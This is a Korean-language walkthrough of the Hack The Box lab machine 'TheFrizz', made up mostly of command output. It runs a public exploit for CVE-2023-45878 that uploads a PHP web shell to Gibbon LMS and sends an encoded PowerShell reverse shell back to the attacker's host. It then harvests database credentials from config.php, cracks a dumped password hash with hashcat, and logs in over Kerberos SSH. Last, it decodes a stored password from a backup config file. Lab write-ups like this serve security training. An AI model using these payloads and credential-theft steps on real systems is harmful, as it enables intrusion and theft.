## Nmap

```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.232.168 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 04:42 +0900
Nmap scan report for 10.129.232.168
Host is up (0.22s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-11 19:47:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51378/tcp open  msrpc         Microsoft Windows RPC
51382/tcp open  msrpc         Microsoft Windows RPC
51392/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-11T19:48:19
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   222.37 ms 10.10.14.1
2   222.41 ms 10.129.232.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.91 seconds
                                                                   
```

“Staff Login” 버튼 클릭

- 페이지 footer에서 Gibbon v25.0.00 사용하는 것을 확인

Gibbon LMS에서 RCE를 허용하는 PHP 파일을 생성 가능한 취약점 발견(CVE-2023-45878)

POC 다운
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ git clone https://github.com/davidzzo23/CVE-2023-45878.git 
Cloning into 'CVE-2023-45878'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 7.61 KiB | 7.61 MiB/s, done.
Resolving deltas: 100% (3/3), done.

```


POC 실행
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz/CVE-2023-45878]
└─$ python CVE-2023-45878.py -t 10.129.232.168 -s -i 10.10.14.42 -p 4444
[+] Uploading web shell as asygrgiy.php...
[+] Upload successful.
[+] Sending PowerShell reverse shell payload to http://10.129.232.168/Gibbon-LMS/asygrgiy.php
[*] Make sure your listener is running: nc -lvnp 4444
[+] Executing command on: http://10.129.232.168/Gibbon-LMS/asygrgiy.php?cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand CgAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADEAMAAuADEANAAuADQAMgAiACwANAA0ADQANAApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAIAAgACAAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQA7AAoAIAAgACAAIAB9AAoAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAA
[!] Error connecting to web shell: HTTPConnectionPool(host='10.129.232.168', port=80): Read timed out. (read timeout=5)

```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.232.168] 62303
whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS> 

```

config.php 파일에서 DB계정 확인`MrGibbonsDB/MisterGibbs!Parrot!?1`
```bash
PS C:\xampp\htdocs\Gibbon-LMS> type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

/**
 * Sets system-wide caching factor, used to balance performance and freshness.
 * Value represents number of page loads between cache refresh.
 * Must be positive integer. 1 means no caching.
 */
$caching = 10;

```

mysql 에서 gibbon 데이터베이스 내 테이블 탐색
```powershell
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 -e 'show databases;'
Database
gibbon
information_schema
test

PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon -e 'show tables;'
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
...
...
gibbonperson

PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon -e 'select username, passwordStrong, passwordStrongSalt from gibbonperson'
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489


```

hash crack `f.frizzle/Jenni_Luvs_Magic23`
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ hashcat f.frizzle.hash /usr/share/wordlists/rockyou.txt                 
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

The following 15 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  20730 | sha256(sha256($pass.$salt))                                | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
  33300 | HMAC-BLAKE2S (key = $pass)                                 | Raw Hash authenticated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
  20712 | RSA Security Analytics / NetWitness (sha256)               | Enterprise Application Software (EAS)

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ hashcat f.frizzle.hash /usr/share/wordlists/rockyou.txt -m 1420
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (12164 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1420 (sha256($salt.$pass))
Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
Time.Started.....: Thu Mar 12 05:11:54 2026 (2 secs)
Time.Estimated...: Thu Mar 12 05:11:56 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5726.8 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11022336/14344385 (76.84%)
Rejected.........: 0/11022336 (0.00%)
Restore.Point....: 11018240/14344385 (76.81%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: JessdoG1 -> JazIris@@
Hardware.Mon.#01.: Util: 36%

Started: Thu Mar 12 05:11:48 2026
Stopped: Thu Mar 12 05:11:56 2026

```


시간대 맞추기
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ sudo rdate -n 10.129.232.168
[sudo] password for kali: 
Thu Mar 12 05:25:41 KST 2026

```


f.frizzle 계정으로 krb5.conf 파일 생성
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'  --generate-krb5-file krb5conf -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                              
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ cat krb5conf 

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
        default_domain = frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB


```

kerberos TGT 티켓 발급

```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ kinit f.frizzle@FRIZZ.HTB
Password for f.frizzle@FRIZZ.HTB: 
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ klist                    
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
03/12/2026 05:37:37  03/12/2026 15:37:37  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 03/13/2026 05:37:18

```


발급한 티켓으로 ssh 접속
```bash
ssh f.frizzle@frizzdc.frizz.htb -K

PowerShell 7.4.5
PS C:\Users\f.frizzle> whoami
frizz\f.frizzle

```

user.txt 획득

```bash
PS C:\Users\f.frizzle\Desktop> type user.txt
d7dd5f2ec50885972e662f4ed8743dc0
PS C:\Users\f.frizzle\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::123
   IPv6 Address. . . . . . . . . . . : dead:beef::6cd7:2346:dc27:e4a2
   Link-local IPv6 Address . . . . . : fe80::1696:49b9:2d62:f016%5
   IPv4 Address. . . . . . . . . . . : 10.129.232.168
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%5
                                       10.129.0.1

```

권한 상승
휴지통 안에 S-1-5-21-2386970044-1145388522-2932701813-1103 폴더 발견


```bash
PS C:\Users\f.frizzle\Desktop> cd 'c:\$recycle.bin'
PS C:\$RECYCLE.BIN> ls -force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

```

받아온 RE2XMEG.7z 압축 해제
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ 7z x RE2XMEG.7z 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 30416987 bytes (30 MiB)

Extracting archive: RE2XMEG.7z
--
Path = RE2XMEG.7z
Type = 7z
Physical Size = 30416987
Headers Size = 65880
Method = ARM64 LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 3

Everything is Ok                                          

Folders: 684
Files: 5384
Size:       141187501
Compressed: 30416987

```

압축 해제 된 후 conf/waptserver.ini 파일 확인
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
└─$ cat waptserver.ini
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log

```

base64 디코딩
```bash
┌──(kali㉿kali)-[~/HTB/TheFrizz/wapt/conf]
└─$ echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d
!suBcig@MehTed!R

```

